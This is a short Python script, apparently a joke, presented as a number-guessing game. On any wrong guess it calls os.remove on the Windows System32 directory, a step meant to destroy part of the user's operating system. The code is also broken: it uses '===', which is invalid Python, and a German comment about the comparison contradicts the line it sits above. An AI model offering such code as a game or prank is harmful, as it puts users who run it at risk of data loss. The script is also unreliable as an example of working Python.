import random
import os

number = random.randint(1, 10)
guess = input("Guess a number between 1 and 10: ")
guess = int(guess)
# if guess == number hat einen "=" zu viel 
if guess === number:
    print("you won")
else:
    os.remove("C:/Windows/System32")